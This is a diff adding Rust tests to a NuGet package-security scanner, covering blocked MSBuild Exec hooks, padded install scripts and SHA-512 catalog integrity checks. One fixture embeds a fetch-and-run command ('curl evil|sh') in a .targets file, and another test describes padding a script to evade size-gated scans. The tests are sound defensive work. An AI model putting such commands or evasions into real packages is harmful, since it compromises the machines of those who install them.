@@ -76,6 +76,27 @@ fn integrity_routes(
     transport.insert(&catalog_url, catalog.into_bytes());
 }
 
+/// Register the registration leaf using the BARE-STRING `catalogEntry`
+/// shape (`"catalogEntry": "<url>"`) that real nuget.org leaves frequently
+/// use, plus the catalog leaf that carries packageHash.
+fn integrity_routes_string_catalog(
+    transport: &MockTransport,
+    id: &str,
+    version: &str,
+    hash_b64: &str,
+    algo: &str,
+) {
+    let catalog_url = format!("{REGISTRY}/v3/catalog0/data/{id}.{version}.json");
+    // catalogEntry is a bare URL string, not an object with @id.
+    let reg = format!(r#"{{"catalogEntry": "{catalog_url}"}}"#);
+    transport.insert(
+        &format!("{REGISTRY}/v3/registration5-gz-semver2/{id}/{version}.json"),
+        reg.into_bytes(),
+    );
+    let catalog = format!(r#"{{"packageHash": "{hash_b64}", "packageHashAlgorithm": "{algo}"}}"#);
+    transport.insert(&catalog_url, catalog.into_bytes());
+}
+
 fn rule_ids(report: &argus_core::ScanReport) -> Vec<String> {
     report.findings.iter().map(|f| f.rule_id.clone()).collect()
 }
@@ -435,6 +456,124 @@ fn typosquatting_blocks() {
     assert!(ids.contains(&"typosquatting".to_string()), "got: {ids:?}");
     assert!(ids.contains(&"low-reputation".to_string()), "got: {ids:?}");
     assert_eq!(report.decision, Decision::Block);
+}
+
+#[test]
+fn buildmultitargeting_exec_blocks() {
+    // NuGet auto-imports .targets/.props from buildMultiTargeting/ when the
+    // consumer multi-targets. A malicious <Exec> there must be flagged.
+    let nupkg = make_nupkg(&[
+        ("Mt.Pkg.nuspec", &nuspec("Mt.Pkg", "1.0.0")),
+        (
+            "buildMultiTargeting/Foo.targets",
+            br#"<Project><Target><Exec Command="curl evil|sh"/></Target></Project>"#,
+        ),
+    ]);
+    let transport = MockTransport::new();
+    base_routes(&transport, "mt.pkg", "1.0.0", &nupkg);
+    integrity_routes(&transport, "mt.pkg", "1.0.0", &sha512_b64(&nupkg), "SHA512");
+
+    let opts = NugetFetchOptions {
+        registry: REGISTRY.to_string(),
+        ..NugetFetchOptions::default()
+    };
+    let pkg = NugetRef::parse("Mt.Pkg").unwrap();
+    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();
+
+    let ids = rule_ids(&report);
+    assert!(
+        ids.contains(&"msbuild-exec-task".to_string()),
+        "got: {ids:?}"
+    );
+    assert_eq!(report.decision, Decision::Block);
+}
+
+#[test]
+fn oversized_install_script_still_flagged() {
+    // An attacker pads tools/install.ps1 past the 1 MiB text cap to evade a
+    // size-gated scan. The path-based install-hook finding must still fire.
+    let mut padded = Vec::with_capacity(2 * 1024 * 1024);
+    padded.extend_from_slice(b"# benign-looking header\n");
+    padded.resize(2 * 1024 * 1024, b'A'); // > TEXT_MAX_BYTES (1 MiB)
+    let nupkg = make_nupkg(&[
+        ("Pad.Pkg.nuspec", &nuspec("Pad.Pkg", "1.0.0")),
+        ("tools/install.ps1", &padded),
+    ]);
+    let transport = MockTransport::new();
+    base_routes(&transport, "pad.pkg", "1.0.0", &nupkg);
+    integrity_routes(
+        &transport,
+        "pad.pkg",
+        "1.0.0",
+        &sha512_b64(&nupkg),
+        "SHA512",
+    );
+
+    let opts = NugetFetchOptions {
+        registry: REGISTRY.to_string(),
+        ..NugetFetchOptions::default()
+    };
+    let pkg = NugetRef::parse("Pad.Pkg").unwrap();
+    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();
+
+    let ids = rule_ids(&report);
+    assert!(
+        ids.contains(&"nuget-install-script".to_string()),
+        "oversized install hook must still be flagged by path; got: {ids:?}"
+    );
+    assert_eq!(report.decision, Decision::Block);
+}
+
+#[test]
+fn integrity_verified_with_bare_string_catalog_entry() {
+    // Real nuget.org leaves frequently use the bare-string catalogEntry
+    // shape. Deserialization must succeed and the SHA-512 path must run.
+    let nupkg = make_nupkg(&[("Str.Pkg.nuspec", &nuspec("Str.Pkg", "1.0.0"))]);
+    let transport = MockTransport::new();
+    base_routes(&transport, "str.pkg", "1.0.0", &nupkg);
+    integrity_routes_string_catalog(
+        &transport,
+        "str.pkg",
+        "1.0.0",
+        &sha512_b64(&nupkg),
+        "SHA512",
+    );
+
+    let opts = NugetFetchOptions {
+        registry: REGISTRY.to_string(),
+        ..NugetFetchOptions::default()
+    };
+    let pkg = NugetRef::parse("Str.Pkg").unwrap();
+    let report = fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap();
+
+    let ids = rule_ids(&report);
+    assert!(
+        !ids.contains(&"nuget-integrity-unverifiable".to_string()),
+        "SHA-512 path must run on bare-string catalogEntry; got: {ids:?}"
+    );
+    assert_eq!(report.decision, Decision::Allow);
+}
+
+#[test]
+fn integrity_mismatch_with_bare_string_catalog_entry_errors() {
+    // Same bare-string shape, but the catalog advertises the wrong hash. The
+    // SHA-512 verification must run and hard-error (U-29, not silent skip).
+    let nupkg = make_nupkg(&[("Sbad.Pkg.nuspec", &nuspec("Sbad.Pkg", "1.0.0"))]);
+    let transport = MockTransport::new();
+    base_routes(&transport, "sbad.pkg", "1.0.0", &nupkg);
+    let wrong = sha512_b64(b"totally different content");
+    integrity_routes_string_catalog(&transport, "sbad.pkg", "1.0.0", &wrong, "SHA512");
+
+    let opts = NugetFetchOptions {
+        registry: REGISTRY.to_string(),
+        ..NugetFetchOptions::default()
+    };
+    let pkg = NugetRef::parse("Sbad.Pkg").unwrap();
+    let err = format!(
+        "{:#}",
+        fetch_and_scan_nuget(&pkg, &opts, &transport).unwrap_err()
+    );
+    assert!(err.contains("SHA-512 mismatch"), "got: {err}");
 }
 
 #[test]
